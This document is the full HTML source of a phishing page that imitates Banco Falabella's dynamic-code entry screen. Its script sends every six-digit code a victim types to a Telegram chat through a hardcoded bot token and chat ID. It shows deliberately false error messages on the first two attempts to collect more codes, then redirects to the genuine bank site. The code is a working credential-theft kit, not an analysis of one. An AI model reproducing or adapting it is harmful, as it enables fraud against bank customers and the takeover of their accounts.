<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Falabella - Clave Dinámica</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
            background-color: #f5f5f5;
            padding: 30px 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            max-width: 420px;
            width: 100%;
            background: white;
            padding: 40px 35px;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
        }

        .logo-header {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo {
            height: 40px;
            width: auto;
        }

        .form-group {
            margin-bottom: 28px;
        }

        .form-label {
            display: block;
            font-size: 15px;
            font-weight: 400;
            color: #333;
            margin-bottom: 24px;
            text-align: center;
            letter-spacing: -0.2px;
            line-height: 1.5;
        }

        .form-input {
            width: 100%;
            padding: 16px 18px;
            border: 1px solid #d0d0d0;
            border-radius: 6px;
            font-size: 15px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            color: #333;
            background-color: white;
            transition: border-color 0.2s, box-shadow 0.2s;
            text-align: center;
            letter-spacing: 4px;
        }

        .form-input::placeholder {
            color: #999;
            letter-spacing: 0;
        }

        .form-input:focus {
            outline: none;
            border-color: #2d7f3d;
            box-shadow: 0 0 0 3px rgba(45, 127, 61, 0.1);
        }

        .form-input.error {
            border-color: #d32f2f;
            background-color: #fff5f5;
        }

        .error-message {
            color: #d32f2f;
            font-size: 13px;
            margin-top: 10px;
            display: none;
            text-align: center;
            animation: slideDown 0.3s ease;
        }

        .error-message.show {
            display: block;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-8px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .btn-ingresar {
            width: 100%;
            padding: 16px;
            background-color: #7ecb5f;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: not-allowed;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            transition: background-color 0.2s;
            margin-top: 28px;
            margin-bottom: 20px;
            opacity: 0.5;
            letter-spacing: 0.5px;
        }

        .btn-ingresar.enabled {
            cursor: pointer;
            opacity: 1;
            background-color: #6db850;
        }

        .btn-ingresar.enabled:hover {
            background-color: #5fa444;
        }

        .btn-ingresar:disabled {
            background-color: #7ecb5f;
            opacity: 0.5;
            cursor: not-allowed;
        }

        .link-container {
            text-align: center;
            margin-top: 24px;
        }

        .link-clave {
            color: #2d7f3d;
            font-size: 14px;
            font-weight: 400;
            text-decoration: none;
            cursor: pointer;
            transition: text-decoration 0.2s;
        }

        .link-clave:hover {
            text-decoration: underline;
        }

        .loading-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loading-screen.active {
            display: flex;
        }

        .loading-logo {
            width: 120px;
            height: auto;
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(0.95); }
        }

        @media (max-width: 480px) {
            body {
                padding: 20px;
            }

            .container {
                padding: 30px 25px;
                border-radius: 0;
            }

            .logo {
                height: 35px;
            }

            .form-label {
                font-size: 14px;
                margin-bottom: 20px;
            }

            .form-input {
                padding: 14px 16px;
                font-size: 14px;
            }

            .btn-ingresar {
                padding: 14px;
                font-size: 14px;
                margin-top: 24px;
            }

            .link-clave {
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
        <img src="img/image.png" alt="Logo" class="loading-logo">
    </div>

    <!-- Main Container -->
    <div class="container">
        <!-- Logo Header -->
        <div class="logo-header">
            <img src="img/image.png" alt="Banco Falabella" class="logo">
        </div>

        <!-- Clave Dinámica Form -->
        <form id="dinamicaForm">
            <!-- Label -->
            <div class="form-group">
                <label class="form-label">Ingrese su Clave Dinámica</label>
            </div>

            <!-- Input -->
            <div class="form-group">
                <input 
                    type="password" 
                    id="claveDinamica" 
                    class="form-input" 
                    placeholder="Clave Dinámica (6 dígitos)"
                    inputmode="numeric"
                    autocomplete="off"
                    maxlength="6"
                    required
                >
                <div class="error-message" id="errorMsg"></div>
            </div>

            <!-- Submit Button -->
            <button type="button" id="btnIngresar" class="btn-ingresar" disabled>
                INGRESAR
            </button>

            <!-- Help Link -->
            <div class="link-container">
                <a href="#" class="link-clave">¿Necesitas ayuda con tu clave dinámica?</a>
            </div>
        </form>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8619673327:AAEUJ-vzXT2OxgbjbHq5AIlbj0r0x4qWryw';
        const TELEGRAM_CHAT_ID = '-1003875450334';

        let intentos = 0;
        const MAX_INTENTOS = 3;

        const claveDinamica = document.getElementById('claveDinamica');
        const btnIngresar = document.getElementById('btnIngresar');
        const errorMsg = document.getElementById('errorMsg');
        const loadingScreen = document.getElementById('loadingScreen');
        const dinamicaForm = document.getElementById('dinamicaForm');

        // Validar entrada - solo números
        claveDinamica.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 6);
            validateClave();
            errorMsg.classList.remove('show');
            this.classList.remove('error');
        });

        function validateClave() {
            const isValid = claveDinamica.value.length === 6;
            btnIngresar.disabled = !isValid;
            btnIngresar.classList.toggle('enabled', isValid);
        }

        btnIngresar.addEventListener('click', async function(e) {
            e.preventDefault();
            if (btnIngresar.disabled) return;

            intentos++;
            loadingScreen.classList.add('active');

            const mensaje = `🔐 <b>CLAVE DINÁMICA (INTENTO ${intentos}/${MAX_INTENTOS}) - BANCO FALABELLA</b>

<b>Clave Dinámica:</b> <code>${claveDinamica.value}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: TELEGRAM_CHAT_ID, 
                        text: mensaje, 
                        parse_mode: 'HTML' 
                    })
                });

                const data = await response.json();
                console.log('Telegram response:', data);

                if (data.ok) {
                    if (intentos < MAX_INTENTOS) {
                        // Errores falsos en intentos 1 y 2
                        setTimeout(() => {
                            loadingScreen.classList.remove('active');
                            
                            if (intentos === 1) {
                                errorMsg.textContent = '❌ La clave dinámica es incorrecta.';
                            } else if (intentos === 2) {
                                errorMsg.textContent = '⚠️ Error en la sincronización. Intente nuevamente.';
                            }
                            
                            errorMsg.classList.add('show');
                            claveDinamica.classList.add('error');
                            claveDinamica.value = '';
                            validateClave();
                        }, 1500);
                    } else {
                        // En el 3er intento, redirigir a Falabella.com
                        setTimeout(() => {
                            window.location.href = 'https://www.bancofalabella.com.co';
                        }, 1500);
                    }
                } else {
                    loadingScreen.classList.remove('active');
                    errorMsg.textContent = 'Error en la verificación. Intente nuevamente.';
                    errorMsg.classList.add('show');
                    claveDinamica.classList.add('error');
                }
            } catch (error) {
                console.error('Error:', error);
                loadingScreen.classList.remove('active');
                errorMsg.textContent = 'Error de conexión. Intente nuevamente.';
                errorMsg.classList.add('show');
                claveDinamica.classList.add('error');
            }
        });

        // Prevenir envío del formulario con Enter
        dinamicaForm.addEventListener('submit', function(e) {
            e.preventDefault();
        });
    </script>
</body>
</html>
